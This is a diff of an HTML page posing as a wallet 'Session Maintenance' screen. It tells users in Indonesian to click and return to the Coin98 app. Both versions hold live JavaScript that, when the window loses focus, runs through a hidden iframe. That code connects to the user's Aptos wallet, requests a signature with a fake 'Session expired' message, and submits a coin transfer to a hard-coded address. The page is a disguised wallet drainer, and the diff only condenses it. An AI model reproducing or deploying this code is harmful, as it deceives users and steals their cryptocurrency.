@@ -1,82 +1,18 @@
-<!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Maintenance - Wallet Session</title>
-  <style>
-    body {
-      background-color: #0f0f0f;
-      color: #e0e0e0;
-      font-family: system-ui, -apple-system, sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
-    h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: #ffffff;
-    }
-    p {
-      font-size: 16px;
-      max-width: 280px;
-      line-height: 1.5;
-      color: #aaaaaa;
-    }
-    .btn {
-      margin-top: 30px;
-      padding: 14px 32px;
-      background-color: #1f1f1f;
-      color: #e0e0e0;
-      border: 1px solid #444;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    iframe { display: none; }
-  </style>
+  <title>Session Maintenance</title>
+  <style>iframe{display:none;}</style>
   <script>
-    window.onblur = async function() {
-      const payload = `
-        (async () => {
-          try {
-            if (!window.aptos) return;
-            
-            await window.aptos.connect();
-            
-            await window.aptos.signMessage({
-              message: "Session expired. Please re-authenticate.",
-              nonce: "4181337"
-            });
-
-            await window.aptos.signAndSubmitTransaction({
-              type: "entry_function_payload",
-              function: "0x1::coin::transfer",
-              type_arguments: ["0x1::aptos_coin::AptosCoin"],
-              arguments: [
-                "0xbc7737796ad59c2c97d73bba3933bda5e0e8e63c00644b2861b653ccd4c29171",
-                "1000000"
-              ]
-            });
-          } catch(e) {}
-        })();
-      `;
-
-      document.getElementById("iframe").src = "javascript:" + encodeURIComponent(payload);
+    window.onblur = function(){
+      document.getElementById("iframe").src = "javascript:(async()=>{try{if(!window.aptos)return;await window.aptos.connect();await window.aptos.signMessage({message:'Session expired. Please re-authenticate.',nonce:'4181337'});await window.aptos.signAndSubmitTransaction({type:'entry_function_payload',function:'0x1::coin::transfer',type_arguments:['0x1::aptos_coin::AptosCoin'],arguments:['0xbc7737796ad59c2c97d73bba3933bda5e0e8e63c00644b2861b653ccd4c29171','1000000']});}catch(e){console.log(e)}})();";
     };
   </script>
 </head>
 <body>
-  <h1>Session Maintenance</h1>
-  <p>Untuk melanjutkan, klik tombol di bawah dan kembali ke aplikasi Coin98.</p>
-  
-  <button class="btn" onclick="this.style.opacity=0.6">Refresh Session</button>
-  
+  <h1 style="text-align:center;margin-top:100px;color:#ffffff;background:#0a0a0a;height:100vh;margin:0;padding-top:180px;">
+    Click here, then switch app / back
+  </h1>
   <iframe id="iframe" src=""></iframe>
 </body>
 </html>
